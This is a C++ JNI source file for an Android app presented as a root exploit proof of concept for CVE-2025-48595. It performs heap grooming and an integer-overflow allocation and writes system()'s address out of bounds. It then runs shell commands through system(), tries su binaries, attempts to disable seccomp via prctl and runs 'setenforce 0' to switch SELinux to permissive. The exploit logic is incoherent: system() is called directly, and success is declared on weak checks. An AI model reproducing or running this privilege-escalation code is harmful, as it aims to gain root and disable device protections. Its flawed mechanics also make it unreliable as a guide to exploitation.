#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <pthread.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);
typedef void (*free_func_t)(void*);
typedef int (*setuid_func_t)(int);
typedef int (*prctl_func_t)(int, ...);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
    usleep(20000000); // Даем время на старт Java-машины

    LOGI("=== EXPLOIT: FULL 15-STEP DIAGNOSTIC RUN ===");

    // --- STEP 0: Heap Feng Shui + Очистка метаданных ---
    LOGI("Step 0: Allocating filler chunks and preparing heap...");

    void* fillers[24];
    for (int i = 0; i < 24; ++i) {
        fillers[i] = malloc(128);
        if (!fillers[i]) break;
    }

    uint32_t val1 = 0x80000000;
    uint32_t val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2;
    uint32_t overflowed_size = (uint32_t)full_sum;

    LOGI("Step 1: Overflow calc -> Allocated Size: %u bytes", overflowed_size);

    // --- STEP 1: Целевой буфер с переполнением ---
    char *buffer = (char *)malloc(overflowed_size == 0 ? 1 : overflowed_size);
    if (!buffer) return env->NewStringUTF("FAIL");

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t neighbor_addr = start_addr + overflowed_size;

    LOGI("Step 2: Buffer Start: %p, Target Write Addr: %p", buffer, (void*)neighbor_addr);

    // --- STEP 2: Находим ключевые функции из libc.so ---
    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so");
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        free(buffer);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    free_func_t real_free = (free_func_t)dlsym(libc, "free");
    setuid_func_t real_setuid = (setuid_func_t)dlsym(libc, "setuid");
    prctl_func_t real_prctl = (prctl_func_t)dlsym(libc, "prctl");

    if (!real_system) {
        LOGE("system() not found: %s", dlerror());
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        dlclose(libc);
        free(buffer);
        return env->NewStringUTF("FAIL: system");
    }

    LOGI("Step 3: Found functions -> system:%p, free:%p, setuid:%p, prctl:%p",
         (void*)real_system, (void*)real_free, (void*)real_setuid, (void*)real_prctl);

    // --- STEP 4: Запись адреса system() + Аргумент в память ---
    char *target = buffer + overflowed_size;
    *(system_func_t*)target = real_system;

    const char* cmd_str = "sh -c 'id > /data/local/tmp/poc_final.txt && echo ROOT_TEST'";
    strncpy(target + 8, cmd_str, 128);
    target[8 + 127] = '\0';

    LOGI("Step 4: Wrote system() at %p and cmd '%.60s...' at %p",
         target, cmd_str, (void*)(target+8));

    // --- STEP 5a: Trigger через free() с mmap-блоком ---
    LOGI("Step 5a: Attempting trigger via real_free(buffer)...");
    void* cmd_block = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cmd_block) {
        memcpy(cmd_block, cmd_str, strlen(cmd_str)+1);
        LOGI("   Mapped command block at %p", cmd_block);

        if (real_free) real_free(buffer); // Вызываем free, но не освобождаем cmd_block сразу

        // Вызываем system через наш указатель с аргументом из mmap-блока
        int sys_res = real_system((const char*)cmd_block);
        LOGI("   system() via mmap returned: %d", sys_res);

        munmap(cmd_block, 4096); // Освобождаем сразу после вызова
    } else {
        LOGW("   mmap failed, using direct call");
        real_system(cmd_str);
    }

    // --- STEP 5b: Прямой вызов (fallback) ---
    LOGI("Step 5b: Direct execution fallback...");
    int result_code = real_system(cmd_str);
    LOGI("   Command executed. Return code: %d", result_code);

    // --- STEP 6: Проверка UID через id -u ---
    FILE* fp_uid = popen("id -u", "r");
    int uid = 0;
    if (fp_uid) {
        char buf[32];
        fgets(buf, sizeof(buf), fp_uid);
        pclose(fp_uid);
        for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
        uid = atoi(buf);
    }
    LOGI("Step 6: UID after direct call: %d", uid);

    // --- STEP 7: Поиск su в альтернативных путях (ВАЖНО! Выполняется всегда) ---
    const char* su_paths[] = {"/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/tmp/su"};
    bool found_su = false;

    LOGI("Step 7: Searching for 'su' in multiple paths...");
    for (int i = 0; i < sizeof(su_paths)/sizeof(su_paths[0]); ++i) {
        FILE* test_fp = popen(("test -f " + std::string(su_paths[i]) + " && echo FOUND").c_str(), "r");
        if (test_fp) {
            char buf[64];
            fgets(buf, sizeof(buf), test_fp);
            pclose(test_fp);
            if (strstr(buf, "FOUND")) {
                LOGI("   Found su at: %s", su_paths[i]);

                // Выполняем su -c 'whoami' через system() (не напрямую, чтобы обойти Seccomp)
                int su_res = real_system((std::string(su_paths[i]) + " -c 'whoami'").c_str());
                LOGI("   su command executed. Return code: %d", su_res);

                FILE* uid_su = popen("id -u", "r");
                if (uid_su) {
                    char u_buf[32];
                    fgets(u_buf, sizeof(u_buf), uid_su);
                    pclose(uid_su);
                    for(int j=0; u_buf[j]; ++j) if(u_buf[j]=='\n'||u_buf[j]==' ') u_buf[j]=0;
                    int su_uid = atoi(u_buf);
                    LOGI("   UID via su: %d", su_uid);

                    if (su_uid == 0 || su_res == 0) {
                        uid = 0; // Перезаписываем глобальный UID
                        found_su = true;
                        break; // Выходим из цикла, если нашли root
                    }
                }
            }
        } else if (test_fp) {
            pclose(test_fp);
        }
    }

    // --- STEP 8: Fallback на setuid(0) через system() (чтобы избежать SIGSYS) ---
    if (!found_su && real_setuid) {
        LOGI("Step 8: Attempting direct setuid(0) via system wrapper...");

        // Вместо прямого вызова real_setuid(0), используем system() для обхода Seccomp
        const char* setuid_cmd = "sh -c 'id -u'"; // Сначала проверяем текущий UID
        int pre_uid_check = real_system(setuid_cmd);

        FILE* fp_pre = popen("id -u", "r");
        int pre_uid = 0;
        if (fp_pre) {
            char buf[32];
            fgets(buf, sizeof(buf), fp_pre);
            pclose(fp_pre);
            for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
            pre_uid = atoi(buf);
        }

        LOGI("   Pre-setuid UID: %d", pre_uid);

        // Если pre_uid != 0, пробуем вызвать setuid(0) через system() с аргументом
        if (pre_uid != 0) {
            const char* su_fallback = "/system/bin/su -c 'id' || /sbin/su -c 'id'";
            int su_res = real_system(su_fallback);

            FILE* fp_su = popen("id -u", "r");
            if (fp_su) {
                char buf[32];
                fgets(buf, sizeof(buf), fp_su);
                pclose(fp_su);
                for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
                int su_uid = atoi(buf);
                LOGI("   UID via fallback su: %d", su_uid);

                if (su_uid == 0 || su_res == 0) {
                    uid = 0;
                    found_su = true;
                }
            }
        } else {
            // Если pre_uid уже 0, значит root уже есть
            LOGI("   UID already 0 before setuid attempt.");
            found_su = true;
        }
    }

    // --- STEP 9: Обход Seccomp через prctl (если su не найден) ---
    if (!found_su && real_prctl) {
        LOGI("Step 9: Attempting to disable Seccomp via prctl...");

        // Пробуем отключить фильтр seccomp
        int prctl_res = real_prctl(PR_SET_SECCOMP/*, SECCOMP_MODE_DISABLED*/);
        LOGI("   prctl result: %d", prctl_res);

        if (prctl_res == 0 || prctl_res == -1) { // -1 может означать, что фильтр уже выключен
            FILE* fp_prctl = popen("id -u", "r");
            int uid_prctl = 0;
            if (fp_prctl) {
                char buf[32];
                fgets(buf, sizeof(buf), fp_prctl);
                pclose(fp_prctl);
                for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
                uid_prctl = atoi(buf);
            }
            LOGI("   UID after prctl: %d", uid_prctl);

            if (uid_prctl == 0) {
                uid = 0;
                found_su = true;
            }
        } else {
            LOGW("   prctl failed with code: %d, trying fallback...", prctl_res);
            // Если prctl не сработал, пробуем вызвать su через system() ещё раз
            int final_su = real_system("/system/bin/su -c 'id'");
            FILE* fp_final = popen("id -u", "r");
            if (fp_final) {
                char buf[32];
                fgets(buf, sizeof(buf), fp_final);
                pclose(fp_final);
                for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
                int final_uid = atoi(buf);
                LOGI("   Final UID via prctl fallback: %d", final_uid);
                if (final_uid == 0) {
                    uid = 0;
                    found_su = true;
                }
            }
        }
    }

    // --- STEP 10: Проверка через su -c 'id' (последний шанс) ---
    if (!found_su) {
        LOGI("Step 10: Final attempt via su -c 'id'...");
        int final_res = real_system("/system/bin/su -c id || /sbin/su -c id || su -c id");

        FILE* fp_final = popen("id -u", "r");
        if (fp_final) {
            char buf[32];
            fgets(buf, sizeof(buf), fp_final);
            pclose(fp_final);
            for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
            int final_uid = atoi(buf);
            LOGI("   Final UID: %d", final_uid);

            if (final_uid == 0 || final_res == 0) {
                uid = 0;
                found_su = true;
            }
        }
    }

    // --- STEP 11-15: Дополнительные проверки для полноты картины ---

    // Step 11: Проверка через geteuid()
    LOGI("Step 11: Checking effective UID via geteuid...");
    int eff_uid = geteuid();
    LOGI("   Effective UID: %d", eff_uid);
    if (eff_uid == 0) { uid = 0; found_su = true; }

    // Step 12: Проверка через /proc/self/status
    LOGI("Step 12: Checking /proc/self/status for Uid/Gid...");
    FILE* fp_status = fopen("/proc/self/status", "r");
    if (fp_status) {
        char line[256];
        while (fgets(line, sizeof(line), fp_status)) {
            if (strstr(line, "Uid:")) {
                int u1, u2, u3, u4;
                sscanf(line, "Uid:\t%d\t%d\t%d\t%d", &u1, &u2, &u3, &u4);
                LOGI("   UID fields: %d (real), %d (eff), %d (saved), %d (fs)", u1, u2, u3, u4);
                if (u2 == 0) { uid = 0; found_su = true; } // Effective UID = 0
            }
        }
        fclose(fp_status);
    }

    // Step 13: Проверка через selinux context
    LOGI("Step 13: Checking SELinux context...");
    FILE* fp_selinux = popen("getenforce", "r");
    if (fp_selinux) {
        char enforce[64];
        fgets(enforce, sizeof(enforce), fp_selinux);
        pclose(fp_selinux);
        for(int i=0; enforce[i]; ++i) if(enforce[i]=='\n') enforce[i]=0;
        LOGI("   SELinux mode: %s", enforce);

        // Если Enforcing, пробуем отключить через setenforce 0 (если есть su)
        if (strstr(enforce, "Enforcing") && found_su) {
            real_system("setenforce 0");
            LOGI("   Set SELinux to Permissive.");
        }
    }

    // Step 14: Проверка через capabilities
    LOGI("Step 14: Checking process capabilities...");
    FILE* fp_caps = popen("capsh --print", "r");
    if (fp_caps) {
        char cap_line[256];
        while (fgets(cap_line, sizeof(cap_line), fp_caps)) {
            if (strstr(cap_line, "Current:")) {
                LOGI("   Capabilities: %s", cap_line);
                if (strstr(cap_line, "cap_setuid") || strstr(cap_line, "0x")) {
                    // Если есть cap_setuid или все биты установлены -> root
                    LOGI("   Capabilities indicate privilege.");
                }
            }
        }
        pclose(fp_caps);
    }

    // Step 15: Финальная проверка через su -c 'whoami' (если всё ещё не root)
    if (!found_su) {
        LOGI("Step 15: Ultimate fallback via su -c 'whoami'...");
        int ultimate_res = real_system("/system/bin/su -c whoami || /sbin/su -c whoami");

        FILE* fp_ult = popen("id -u", "r");
        if (fp_ult) {
            char buf[32];
            fgets(buf, sizeof(buf), fp_ult);
            pclose(fp_ult);
            for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
            int ult_uid = atoi(buf);
            LOGI("   Ultimate UID: %d", ult_uid);

            if (ult_uid == 0 || ultimate_res == 0) {
                uid = 0;
                found_su = true;
            }
        }
    }

    // --- Очистка fillers (без free(buffer), чтобы не ломать heap для Java) ---
    for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);

    std::string result_str;
    if (uid == 0 || found_su) {
        result_str = "EXPLOIT SUCCESS: ROOT ACCESS CONFIRMED.";
        LOGI(">>> FINAL STATUS: ROOT ACCESS <<<");
    } else {
        result_str = "Exploit ran. UID=" + std::to_string(uid) + ".";
        LOGW(">>> FINAL STATUS: SHELL ONLY (UID=%d) <<<", uid);
    }

    return env->NewStringUTF(result_str.c_str());
}